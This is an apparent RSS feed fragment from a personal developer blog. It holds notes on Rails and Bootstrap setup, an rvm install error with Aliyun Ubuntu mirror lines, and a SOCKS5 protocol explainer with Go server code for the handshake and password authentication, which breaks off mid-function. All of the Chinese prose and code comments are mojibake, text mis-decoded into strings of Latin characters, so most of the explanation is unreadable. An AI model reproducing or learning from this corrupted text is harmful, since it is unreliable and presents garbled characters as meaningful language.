&lt;p&gt;æ³¨æ„åœ¨ä¸Šé¢å¯èƒ½ä¼šæœ‰ç‚¹é—®é¢˜ï¼ŒGemåˆ›å»ºRailsé¡¹ç›®çš„æ—¶å€™ä¼šä¸‹è½½å„ç§ä¾èµ–ï¼Œè¿™äº›ä¾èµ–æœ‰å¯èƒ½ä¼šåœ¨Windowsçš„ç¯å¢ƒä¸Šå‡ºç°é—®é¢˜ï¼Œæ¯”å¦‚æˆ‘é‡åˆ°çš„ SQLite3,æ‰€ä»¥Rubyæœ€å¥½è¿˜æ˜¯ä¸è¦åœ¨Windownsä¸Šè¿è¡Œã€‚&lt;/p&gt;
&lt;p&gt;è¿˜æœ‰Rails æ˜¯è¦ä¾èµ– Yarnå’Œ nodejs æœ€å¥½æ˜¯10ç‰ˆæœ¬ä»¥ä¸Š&lt;/p&gt;
&lt;h2 id=&#34;development-note&#34;&gt;Development Note&lt;/h2&gt;
&lt;p&gt;èŠ±äº†å¾ˆé•¿æ—¶é—´å»å§Railså’Œä¸€äº›å¤§å‰ç«¯çš„æ¡†æ¶åˆäºŒä¸ºä¸€ï¼Œæœ€åä»¥å¤±è´¥è€Œå‘Šç»ˆã€‚
Railsç»ˆç©¶æ˜¯ä¸ªå…¨æ ˆå¼çš„Webæ¡†æ¶ï¼Œè€è€å®å®ç”¨ç®€å•çš„å°±è¡Œã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Bootstrap Configuration&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# =&amp;gt; é¦–å…ˆåœ¨ Gemfile ä¸­åŠ å…¥&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;gem&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;bootstrap&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;~&amp;gt; 4.3.1&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;gem&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;jquery-rails&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¹‹åå°†&lt;!-- raw HTML omitted --&gt;app\assets\stylesheets\application.css&lt;!-- raw HTML omitted --&gt; æ”¹ä¸º scss&lt;/p&gt;
&lt;p&gt;åˆ æ‰æ‰€æœ‰çš„ä¸œè¥¿åŒ…æ‹¬æ³¨é‡Š&lt;/p&gt;
&lt;p&gt;åŠ å…¥&lt;!-- raw HTML omitted --&gt;@import &amp;ldquo;bootstrap&amp;rdquo;;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;ruby-note-todo&#34;&gt;Ruby Note Todo&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;Error running &#39;requirements_debian_libs_install g++ gcc autoconf automake bison libc6-dev libffi-dev libgdbm-dev libncurses5-dev libsqlite3-dev libtool libyaml-dev make pkg-config sqlite3 zlib1g-dev libgmp-dev libreadline-dev libssl-dev&#39;,
please read /home/sdttttt/.rvm/log/1573869340/package_install_g++_gcc_autoconf_automake_bison_libc6-dev_libffi-dev_libgdbm-dev_libncurses5-dev_libsqlite3-dev_libtool_libyaml-dev_make_pkg-config_sqlite3_zlib1g-dev_libgmp-dev_libreadline-dev_libssl-dev.log
Requirements installation failed with status: 100.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç¢°åˆ°è¿™ç§é”™è¯¯ä¸éœ€è¦ç´§å¼ ï¼Œ&lt;!-- raw HTML omitted --&gt;rvm requirements&lt;!-- raw HTML omitted --&gt; command çš„åŸç†å°±æ˜¯ä¼šä½¿ç”¨ä½ ç³»ç»Ÿçš„åŒ…ç®¡ç†å·¥å…·å»ä¸‹è½½è¿™äº›ä¾èµ–ï¼Œæ‰€ä»¥åŸå› å¾ˆç®€å•ï¼Œä½ çš„æºé‡Œæ‰¾ä¸åˆ°è¿™äº›ä¾èµ–å°±ä¼šæŠ¥å‡º100çš„é”™è¯¯ã€‚
æ˜¯Ubuntuçš„è¯ä¸‹é¢æˆ‘æä¾›äº†æº&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#æ·»åŠ é˜¿é‡Œæº
deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>Socks5</title>
        <link>https://sdttttt.github.io/p/socks5/</link>
        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
        
        <guid>https://sdttttt.github.io/p/socks5/</guid>
        <description>&lt;p&gt;SOCKS æ˜¯ä¸€ç§ç½‘ç»œä¼ è¾“åè®®ï¼Œä¸»è¦ç”¨äºå®¢æˆ·ç«¯ä¸å¤–ç½‘æœåŠ¡å™¨ä¹‹é—´é€šè®¯çš„ä¸­é—´ä¼ é€’ï¼ŒSOCKS æ˜¯&amp;quot;SOCKetS&amp;quot;çš„ç¼©å†™ã€‚
SOCKS5 æ˜¯ SOCKS4 çš„å‡çº§ç‰ˆï¼Œå…¶ä¸»è¦å¤šäº†é‰´å®šã€IPv6ã€UDP æ”¯æŒã€‚&lt;/p&gt;
&lt;p&gt;SOCKS5 åè®®å¯ä»¥åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;(1) åè®®ç‰ˆæœ¬åŠè®¤è¯æ–¹å¼&lt;/li&gt;
&lt;li&gt;(2) æ ¹æ®è®¤è¯æ–¹å¼æ‰§è¡Œå¯¹åº”çš„è®¤è¯&lt;/li&gt;
&lt;li&gt;(3) è¯·æ±‚ä¿¡æ¯&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;1åè®®ç‰ˆæœ¬åŠè®¤è¯æ–¹å¼&#34;&gt;ï¼ˆ1ï¼‰åè®®ç‰ˆæœ¬åŠè®¤è¯æ–¹å¼&lt;/h4&gt;
&lt;p&gt;åˆ›å»ºä¸ SOCKS5 æœåŠ¡å™¨çš„ TCP è¿æ¥å&lt;strong&gt;å®¢æˆ·ç«¯&lt;/strong&gt;éœ€è¦å…ˆå‘é€è¯·æ±‚æ¥åè®®ç‰ˆæœ¬åŠè®¤è¯æ–¹å¼ï¼Œ&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;VER&lt;/th&gt;
&lt;th&gt;NMETHODS&lt;/th&gt;
&lt;th&gt;METHODS&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1-255&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;VER æ˜¯ SOCKS ç‰ˆæœ¬ï¼Œè¿™é‡Œåº”è¯¥æ˜¯ 0x05ï¼›&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;NMETHODS æ˜¯ METHODS éƒ¨åˆ†çš„é•¿åº¦ï¼›&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;METHODS æ˜¯å®¢æˆ·ç«¯æ”¯æŒçš„è®¤è¯æ–¹å¼åˆ—è¡¨ï¼Œæ¯ä¸ªæ–¹æ³•å  1 å­—èŠ‚ã€‚å½“å‰çš„å®šä¹‰æ˜¯ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;0x00 ä¸éœ€è¦è®¤è¯&lt;/li&gt;
&lt;li&gt;0x01 GSSAPI&lt;/li&gt;
&lt;li&gt;0x02 ç”¨æˆ·åã€å¯†ç è®¤è¯&lt;/li&gt;
&lt;li&gt;0x03 - 0x7F ç”± IANA åˆ†é…ï¼ˆä¿ç•™ï¼‰&lt;/li&gt;
&lt;li&gt;0x80 - 0xFE ä¸ºç§äººæ–¹æ³•ä¿ç•™&lt;/li&gt;
&lt;li&gt;0xFF æ— å¯æ¥å—çš„æ–¹æ³•&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;æœåŠ¡å™¨&lt;/strong&gt;å›å¤å®¢æˆ·ç«¯å¯ç”¨æ–¹æ³•ï¼š&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;VER&lt;/th&gt;
&lt;th&gt;METHOD&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;VER æ˜¯ SOCKS ç‰ˆæœ¬ï¼Œè¿™é‡Œåº”è¯¥æ˜¯ 0x05ï¼›&lt;/li&gt;
&lt;li&gt;METHOD æ˜¯æœåŠ¡ç«¯é€‰ä¸­çš„æ–¹æ³•ã€‚å¦‚æœè¿”å› 0xFF è¡¨ç¤ºæ²¡æœ‰ä¸€ä¸ªè®¤è¯æ–¹æ³•è¢«é€‰ä¸­ï¼Œå®¢æˆ·ç«¯éœ€è¦å…³é—­è¿æ¥ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä»£ç å®ç°ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-golang&#34; data-lang=&#34;golang&#34;&gt;&lt;span class=&#34;kd&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ProtocolVersion&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;VER&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;uint8&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;NMETHODS&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;uint8&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;METHODS&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;uint8&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;


&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ProtocolVersion&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;handshake&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;conn&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Conn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;error&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;make&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([]&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;255&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Println&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;VER&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//ReadByte reads and returns a single byteï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºsocksçš„ç‰ˆæœ¬å·
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;NMETHODS&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//nmethodsæ˜¯è®°å½•methodsçš„é•¿åº¦çš„ã€‚nmethodsçš„é•¿åº¦æ˜¯1ä¸ªå­—èŠ‚
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;n&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;NMETHODS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;errors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;New&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;åè®®é”™è¯¯, sNMETHODSä¸å¯¹&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;METHODS&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;NMETHODS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//è¯»å–æŒ‡å®šé•¿åº¦ä¿¡æ¯ï¼Œè¯»å–æ­£å¥½len(buf)é•¿åº¦çš„å­—èŠ‚ã€‚å¦‚æœå­—èŠ‚æ•°ä¸æ˜¯æŒ‡å®šé•¿åº¦ï¼Œåˆ™è¿”å›é”™è¯¯ä¿¡æ¯å’Œæ­£ç¡®çš„å­—èŠ‚æ•°
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;VER&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;errors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;New&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;è¯¥åè®®ä¸æ˜¯socks5åè®®&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;//æœåŠ¡å™¨å›åº”å®¢æˆ·ç«¯æ¶ˆæ¯:
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;//ç¬¬ä¸€ä¸ªå‚æ•°è¡¨ç¤ºç‰ˆæœ¬å·ä¸º5ï¼Œå³socks5åè®®ï¼Œ
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// ç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºæœåŠ¡ç«¯é€‰ä¸­çš„è®¤è¯æ–¹æ³•ï¼Œ0å³æ— éœ€å¯†ç è®¿é—®, 2è¡¨ç¤ºéœ€è¦ç”¨æˆ·åå’Œå¯†ç è¿›è¡ŒéªŒè¯ã€‚
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;resp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;2æ ¹æ®è®¤è¯æ–¹å¼æ‰§è¡Œå¯¹åº”çš„è®¤è¯&#34;&gt;ï¼ˆ2ï¼‰æ ¹æ®è®¤è¯æ–¹å¼æ‰§è¡Œå¯¹åº”çš„è®¤è¯&lt;/h4&gt;
&lt;p&gt;SOCKS5 åè®®æä¾› 5 ç§è®¤è¯æ–¹å¼ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;0x00 ä¸éœ€è¦è®¤è¯&lt;/li&gt;
&lt;li&gt;0x01 GSSAPI&lt;/li&gt;
&lt;li&gt;0x02 ç”¨æˆ·åã€å¯†ç è®¤è¯&lt;/li&gt;
&lt;li&gt;0x03 - 0x7F ç”± IANA åˆ†é…ï¼ˆä¿ç•™ï¼‰&lt;/li&gt;
&lt;li&gt;0x80 - 0xFE ä¸ºç§äººæ–¹æ³•ä¿ç•™&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è¿™é‡Œå°±ä¸»è¦ä»‹ç»ç”¨æˆ·åã€å¯†ç è®¤è¯ã€‚
åœ¨å®¢æˆ·ç«¯ã€æœåŠ¡ç«¯åå•†ä½¿ç”¨ç”¨æˆ·åå¯†ç è®¤è¯åï¼Œå®¢æˆ·ç«¯å‘å‡ºç”¨æˆ·åå¯†ç ï¼š&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;é‰´å®šåè®®ç‰ˆæœ¬&lt;/th&gt;
&lt;th&gt;ç”¨æˆ·åé•¿åº¦&lt;/th&gt;
&lt;th&gt;ç”¨æˆ·å&lt;/th&gt;
&lt;th&gt;å¯†ç é•¿åº¦&lt;/th&gt;
&lt;th&gt;å¯†ç &lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;åŠ¨æ€&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;åŠ¨æ€&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;æœåŠ¡å™¨é‰´å®šåå‘å‡ºå¦‚ä¸‹å›åº”ï¼š&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;é‰´å®šåè®®ç‰ˆæœ¬&lt;/th&gt;
&lt;th&gt;é‰´å®šçŠ¶æ€&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;å…¶ä¸­é‰´å®šçŠ¶æ€ 0x00 è¡¨ç¤ºæˆåŠŸï¼Œ0x01 è¡¨ç¤ºå¤±è´¥ã€‚&lt;/p&gt;
&lt;p&gt;ä»£ç å®ç°ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-golang&#34; data-lang=&#34;golang&#34;&gt;&lt;span class=&#34;kd&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Socks5Auth&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;VER&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;uint8&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;ULEN&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;uint8&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;UNAME&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;PLEN&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;uint8&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;PASSWD&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Socks5Auth&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;authenticate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;conn&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Conn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;error&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;make&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([]&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;128&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Println&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;VER&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
